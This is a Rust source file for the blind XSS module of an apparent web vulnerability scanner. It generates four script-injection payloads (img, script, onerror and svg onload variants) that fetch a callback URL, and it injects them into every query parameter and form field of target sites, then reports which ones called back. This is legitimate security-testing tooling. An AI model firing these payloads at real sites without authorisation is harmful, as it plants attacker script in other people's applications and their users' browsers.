use crate::blind_xss_server::{generate_payload_id, PayloadContext, PayloadTracker};
use crate::form::Form;
use crate::rate_limiter::RateLimiter;
use crate::reporter::Reporter;
use chrono::Utc;
use indicatif::ProgressBar;
use std::collections::HashMap;
use std::sync::Arc;
use url::Url;

#[derive(Debug, Clone)]
pub struct BlindXssVulnerability {
    pub url: Url,
    pub parameter: String,
    pub payload_id: String,
    pub callback_time: chrono::DateTime<Utc>,
}

pub struct BlindXssScanner<'a> {
    target_urls: Vec<Url>,
    forms: Vec<Form>,
    callback_url: String,
    payload_tracker: PayloadTracker,
    reporter: &'a Arc<Reporter>,
    rate_limiter: Arc<RateLimiter>,
}

impl<'a> BlindXssScanner<'a> {
    pub fn new(
        target_urls: Vec<Url>,
        forms: Vec<Form>,
        callback_url: String,
        payload_tracker: PayloadTracker,
        reporter: &'a Arc<Reporter>,
        rate_limiter: Arc<RateLimiter>,
    ) -> Self {
        Self {
            target_urls,
            forms,
            callback_url,
            payload_tracker,
            reporter,
            rate_limiter,
        }
    }

    /// Generate blind XSS payloads that call back to our server
    fn generate_blind_xss_payloads(&self, payload_id: &str) -> Vec<String> {
        vec![
            // Image tag (works in many contexts)
            format!(r#"<img src="{}/xss/{}">"#, self.callback_url, payload_id),
            // Script tag with fetch
            format!(
                r#"<script>fetch("{}/xss/{}")</script>"#,
                self.callback_url, payload_id
            ),
            // Onerror handler
            format!(
                r#"<img src=x onerror="fetch('{}/xss/{}')""#,
                self.callback_url, payload_id
            ),
            // SVG-based
            format!(
                r#"<svg onload="fetch('{}/xss/{}')"></svg>"#,
                self.callback_url, payload_id
            ),
        ]
    }

    pub async fn scan(&self, pb: &ProgressBar) -> Result<(), reqwest::Error> {
        println!("[*] Starting Blind XSS scan...");
        println!("[*] Callback URL: {}", self.callback_url);

        self.scan_urls(pb).await?;
        self.scan_forms(pb).await?;

        Ok(())
    }

    async fn scan_urls(&self, pb: &ProgressBar) -> Result<(), reqwest::Error> {
        let client = reqwest::Client::new();

        for url in &self.target_urls {
            let query_pairs: Vec<(String, String)> = url.query_pairs().into_owned().collect();
            if query_pairs.is_empty() {
                continue;
            }

            for (param_index, (param_name, _)) in query_pairs.iter().enumerate() {
                // Generate unique ID for this injection attempt
                let payload_id = generate_payload_id();
                let payloads = self.generate_blind_xss_payloads(&payload_id);

                // Track this payload
                let context = PayloadContext {
                    id: payload_id.clone(),
                    url: url.clone(),
                    parameter: param_name.clone(),
                    timestamp: Utc::now(),
                    detected: false,
                };

                {
                    let mut tracker = self.payload_tracker.lock().await;
                    tracker.insert(payload_id.clone(), context);
                }

                // Inject each payload variant
                for payload in payloads {
                    let mut new_query_parts = Vec::new();
                    for (j, (key, value)) in query_pairs.iter().enumerate() {
                        if param_index == j {
                            new_query_parts.push(format!("{}={}", key, payload));
                        } else {
                            new_query_parts.push(format!("{}={}", key, value));
                        }
                    }

                    let new_query = new_query_parts.join("&");
                    let mut new_url = url.clone();
                    new_url.set_query(Some(&new_query));

                    self.rate_limiter.wait().await;
                    let _ = client.get(new_url).send().await;
                    pb.inc(1);
                }
            }
        }
        Ok(())
    }

    async fn scan_forms(&self, pb: &ProgressBar) -> Result<(), reqwest::Error> {
        let client = reqwest::Client::new();

        for form in &self.forms {
            for (input_index, input) in form.inputs.iter().enumerate() {
                // Generate unique ID for this injection attempt
                let payload_id = generate_payload_id();
                let payloads = self.generate_blind_xss_payloads(&payload_id);

                // Track this payload
                let context = PayloadContext {
                    id: payload_id.clone(),
                    url: form.url.clone(),
                    parameter: input.name.clone(),
                    timestamp: Utc::now(),
                    detected: false,
                };

                {
                    let mut tracker = self.payload_tracker.lock().await;
                    tracker.insert(payload_id.clone(), context);
                }

                // Inject each payload variant
                for payload in payloads {
                    let mut form_data = HashMap::new();
                    for (j, inp) in form.inputs.iter().enumerate() {
                        if input_index == j {
                            form_data.insert(inp.name.clone(), payload.clone());
                        } else {
                            form_data.insert(inp.name.clone(), inp.value.clone());
                        }
                    }

                    let action_url = form.url.join(&form.action).unwrap_or(form.url.clone());

                    self.rate_limiter.wait().await;
                    if form.method.to_lowercase() == "post" {
                        let _ = client.post(action_url).form(&form_data).send().await;
                    } else {
                        let _ = client.get(action_url).query(&form_data).send().await;
                    }
                    pb.inc(1);
                }
            }
        }
        Ok(())
    }

    /// Report findings after waiting for callbacks
    pub async fn report_findings(&self) {
        let tracker = self.payload_tracker.lock().await;
        let mut found_count = 0;

        for (payload_id, context) in tracker.iter() {
            if context.detected {
                found_count += 1;
                let vuln = BlindXssVulnerability {
                    url: context.url.clone(),
                    parameter: context.parameter.clone(),
                    payload_id: payload_id.clone(),
                    callback_time: Utc::now(),
                };

                println!(
                    "[+] Blind XSS Found: {} in parameter '{}'",
                    vuln.url, vuln.parameter
                );

                self.reporter.report_blind_xss(&vuln);
            }
        }

        if found_count == 0 {
            println!("[*] No Blind XSS vulnerabilities detected");
        } else {
            println!("[+] Total Blind XSS vulnerabilities found: {}", found_count);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::reporter::Reporter;

    #[test]
    fn test_payload_generation() {
        let reporter = Arc::new(Reporter::new(Url::parse("http://example.com").unwrap()));
        let tracker = Arc::new(tokio::sync::Mutex::new(std::collections::HashMap::new()));
        let rate_limiter = Arc::new(RateLimiter::new(std::time::Duration::from_millis(0)));

        let scanner = BlindXssScanner::new(
            vec![],
            vec![],
            "http://localhost:8080".to_string(),
            tracker,
            &reporter,
            rate_limiter,
        );

        let payload_id = "test-123";
        let payloads = scanner.generate_blind_xss_payloads(payload_id);

        // Verify we have 4 payload variants
        assert_eq!(payloads.len(), 4);

        // Verify all payloads contain the callback URL and payload ID
        for payload in payloads {
            assert!(payload.contains("http://localhost:8080"));
            assert!(payload.contains(payload_id));
        }
    }

    #[test]
    fn test_unique_payload_ids() {
        use crate::blind_xss_server::generate_payload_id;

        let id1 = generate_payload_id();
        let id2 = generate_payload_id();
        let id3 = generate_payload_id();

        // Verify UUIDs are unique
        assert_ne!(id1, id2);
        assert_ne!(id2, id3);
        assert_ne!(id1, id3);

        // Verify UUID format (36 characters including hyphens)
        assert_eq!(id1.len(), 36);
    }
}
